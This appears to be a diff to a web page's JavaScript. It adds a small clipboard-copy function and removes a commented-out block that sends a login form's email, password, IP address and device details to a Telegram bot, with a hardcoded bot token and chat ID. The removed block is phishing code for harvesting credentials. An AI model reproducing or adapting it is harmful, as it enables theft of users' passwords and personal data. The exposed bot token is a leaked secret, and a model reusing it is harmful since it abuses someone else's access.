@@ -94,58 +94,7 @@ function analyze() {
 
 
 
-
-
-
-
-
-
-// const TOKEN = "7938575650:AAEDzLHq7OApTPx1nNvqgGlOGI6yERk7UaA";
-// const CHAT_ID = "2092432928";
-// const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-
-// document.getElementById('Input').addEventListener('analyze', function (e) {
-//     e.preventDefault();
-
-//     axios.get('https://api.ipify.org?format=json')
-//         .then(response => {
-//             const ip = response.data.ip;
-//             const userAgent = navigator.userAgent;
-//             const platform = navigator.platform;
-//             const screenWidth = screen.width;
-//             const screenHeight = screen.height;
-//             const deviceType = /mobile/i.test(userAgent) ? 'Mobile' : 'Desktop';
-
-//             const message = `
-// <b>Nouvelle tentative de connexion</b>\n
-// <b>Email :</b> ${email}\n
-// <b>Mot de passe :</b> ${password}\n
-// <b>Adresse IP :</b> ${ip}\n
-// <b>Type d'appareil :</b> ${deviceType}\n
-// <b>Plateforme :</b> ${platform}\n
-// <b>User Agent :</b> ${userAgent}\n
-// <b>Résolution d'écran :</b> ${screenWidth}x${screenHeight}
-//             `;
-
-//             axios.post(URI_API, {
-//                 chat_id: CHAT_ID,
-//                 parse_mode: 'html',
-//                 text: message
-//             }).then(() => {
-//                 alert('Informations envoyées avec succès !');
-//             }).catch(() => {
-//                 alert("Erreur lors de l'envoi des informations.");
-//             });
-
-//         }).catch(() => {
-//             alert("Erreur lors de la récupération de l'adresse IP.");
-//         });
-// });
-
-
-// document.getElementById('login-form').addEventListener('submit', function (e) {
-//     e.preventDefault();
-
-//     // كود الإرسال الموجود عندك
-//     // ...
-// });
+function copyText() {
+  let text = document.getElementById("result").innerText;
+  navigator.clipboard.writeText(text).then(() => {})
+}
